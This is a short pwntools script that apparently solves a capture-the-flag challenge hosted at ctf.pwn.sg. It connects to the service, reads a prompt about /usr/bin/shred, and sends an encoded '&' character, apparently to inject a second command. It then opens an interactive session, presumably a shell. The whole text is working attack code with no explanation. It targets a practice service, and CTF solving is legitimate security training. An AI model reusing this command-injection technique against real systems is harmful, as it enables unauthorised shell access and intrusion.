from pwn import *

r = remote('ctf.pwn.sg', 4020)

r.recvuntil('Here comes the shredder! (/usr/bin/shred ')
fil = r.recvuntil(')', drop=True)
r.sendline('11')
r.sendline(hex(ord('&'))[2:])
r.interactive()

